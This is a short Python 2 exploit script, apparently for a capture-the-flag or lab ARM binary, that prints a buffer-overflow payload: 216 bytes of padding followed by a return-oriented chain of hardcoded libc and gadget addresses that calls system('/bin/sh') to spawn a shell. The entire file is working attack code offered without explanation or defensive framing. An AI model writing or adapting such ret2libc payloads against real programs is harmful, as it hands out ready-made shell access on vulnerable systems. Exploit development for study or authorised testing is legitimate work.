import sys


libc_system = "\xcc\x34\xf0\xb6" # <__libc_system>
libc_binsh = "\x2c\xbf\xfa\xb6"
libc_execve = "\x9c\x84\xf4\xb6"

bx_lr = "\xac\x84\x00\x00"
blx_r4 = "\x1d\xfb\xee\xb6"
pop_r0_r1 = "\x65\x18\xf4\xb6"
pop_r3 = 0x000083c
pop_r0123457 = "\x6f\x0b\xf0\xb6"


payload = ""
payload += "A" * 216
payload += libc_system
payload += pop_r0_r1
payload += libc_binsh   # r0
payload += "\x00" * 4   # r1
payload += libc_system

print payload
